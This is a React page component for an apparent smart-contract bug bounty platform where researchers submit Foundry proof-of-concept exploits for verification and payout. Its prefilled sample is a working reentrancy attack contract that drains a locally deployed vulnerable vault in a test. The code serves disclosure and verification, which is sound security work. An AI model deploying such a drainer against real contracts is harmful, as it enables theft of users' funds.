import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { api, type Program, type SubmitResponse } from "../lib/api";

const SAMPLE_POC = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IVault {
    function deposit() external payable;
    function withdraw(uint256) external;
    function totalBalance() external view returns (uint256);
}

contract Attacker {
    IVault public vault;
    uint256 public seed;
    constructor(address _vault) payable {
        vault = IVault(_vault);
        seed = msg.value;
    }
    function pwn() external {
        vault.deposit{value: seed}();
        vault.withdraw(seed);
    }
    receive() external payable {
        if (address(vault).balance >= seed) vault.withdraw(seed);
    }
}

contract ExploitVaultTest is Test {
    function test_drain_vulnerable_vault() public {
        address vault = deployCode("VulnerableVault.sol:VulnerableVault");
        vm.deal(address(this), 100 ether);
        IVault(vault).deposit{value: 5 ether}();
        Attacker attacker = new Attacker{value: 1 ether}(vault);
        attacker.pwn();
        uint256 stolen = address(attacker).balance;
        assertGt(stolen, 5 ether, "attacker should drain pool");
        console.log("FUNDS_AT_RISK_WEI:", stolen);
    }
}
`;

const MOCK_RESEARCHER_ADDR = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC";

export default function Submit() {
  const navigate = useNavigate();
  const [programs, setPrograms] = useState<Program[]>([]);
  const [programId, setProgramId] = useState<string>("");
  const [chainId, setChainId] = useState<number>(84532);
  const [target, setTarget] = useState<string>("");
  const [forkBlock, setForkBlock] = useState<string>("");
  const [researcher, setResearcher] = useState<string>(
    import.meta.env.VITE_MOCK_MODE === "true" ? MOCK_RESEARCHER_ADDR : "",
  );
  const [poc, setPoc] = useState<string>(SAMPLE_POC);
  const [busy, setBusy] = useState(false);
  const [result, setResult] = useState<SubmitResponse | null>(null);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    api.programs().then((ps) => {
      setPrograms(ps);
      if (ps.length > 0) {
        setProgramId(ps[0].id);
        setTarget(ps[0].target_contract);
        setChainId(ps[0].chain_id);
      }
    }).catch((e) => setError(String(e)));
  }, []);

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    setBusy(true); setError(null); setResult(null);
    try {
      const r = await api.submit({
        program_id: programId,
        target_contract: target,
        chain_id: chainId,
        fork_block: forkBlock ? Number(forkBlock) : undefined,
        researcher_address: researcher,
        poc_solidity: poc,
      });
      setResult(r);
    } catch (e) {
      setError(String(e));
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="space-y-6">
      <h2 className="text-3xl font-bold">Submit a Proof-of-Concept</h2>

      {!result && (
        <form onSubmit={onSubmit} className="space-y-4 tile">
          <div className="grid grid-cols-2 gap-4">
            <Field label="Program">
              <select
                value={programId}
                onChange={(e) => {
                  const p = programs.find((p) => p.id === e.target.value);
                  setProgramId(e.target.value);
                  if (p) { setTarget(p.target_contract); setChainId(p.chain_id); }
                }}
                className="w-full bg-b3-ink border border-b3-fog rounded p-2"
              >
                {programs.map((p) => <option key={p.id} value={p.id}>{p.name} — {p.company}</option>)}
              </select>
            </Field>
            <Field label="Researcher payout address">
              <input value={researcher} onChange={(e) => setResearcher(e.target.value)} placeholder="0x…" className="w-full bg-b3-ink border border-b3-fog rounded p-2" required />
            </Field>
            <Field label="Target contract">
              <input value={target} onChange={(e) => setTarget(e.target.value)} placeholder="0x…" className="w-full bg-b3-ink border border-b3-fog rounded p-2" required />
            </Field>
            <Field label="Chain ID">
              <input value={chainId} onChange={(e) => setChainId(Number(e.target.value))} type="number" className="w-full bg-b3-ink border border-b3-fog rounded p-2" required />
            </Field>
            <Field label="Fork block (optional)">
              <input value={forkBlock} onChange={(e) => setForkBlock(e.target.value)} className="w-full bg-b3-ink border border-b3-fog rounded p-2" />
            </Field>
          </div>

          <Field label="Foundry PoC source (.t.sol)">
            <textarea
              value={poc}
              onChange={(e) => setPoc(e.target.value)}
              rows={16}
              className="w-full bg-b3-ink border border-b3-fog rounded p-2 font-mono text-xs"
            />
            <p className="text-xs text-b3-bone/40 mt-1">
              Tip: emit <code>console.log("FUNDS_AT_RISK_WEI: …")</code> so B³ can compute USD impact.
            </p>
          </Field>

          {error && <p className="text-b3-alarm text-sm">{error}</p>}
          <button
            disabled={busy || !programId}
            className="px-6 py-3 rounded-md bg-b3-mint text-b3-ink font-bold disabled:opacity-50"
          >
            {busy ? "Verifying inside TEE…" : "Submit"}
          </button>
        </form>
      )}

      {result && (
        <div className="tile space-y-3">
          <h3 className="text-2xl font-bold text-b3-mint glow-mint">Attestation issued</h3>
          <p className="text-sm">
            <strong>{result.severity}</strong> — CVSS {result.cvss_score}, ${" "}
            {result.funds_at_risk_usd.toLocaleString()} at risk.
          </p>
          <p className="text-xs text-b3-bone/60">
            Bounty for this severity tier: <strong>${result.bounty_amount_usd.toLocaleString()}</strong>.
            Tell the company to deposit USDC to{" "}
            <code className="bg-b3-ink/50 px-1">{result.deposit_to}</code> on chain {result.deposit_chain_id},
            then call <code>POST /deposit/{result.attestation_id}</code>.
          </p>
          <div className="flex gap-3 pt-3">
            <button
              onClick={() => navigate(`/verify/${result.attestation_id}`)}
              className="px-4 py-2 rounded bg-b3-mint text-b3-ink font-bold"
            >
              Run verification ceremony
            </button>
            <button
              onClick={() => navigate(`/attestation/${result.attestation_id}`)}
              className="px-4 py-2 rounded border border-b3-bone/30"
            >
              View attestation
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <label className="block text-sm">
      <span className="text-b3-bone/70">{label}</span>
      <div className="mt-1">{children}</div>
    </label>
  );
}
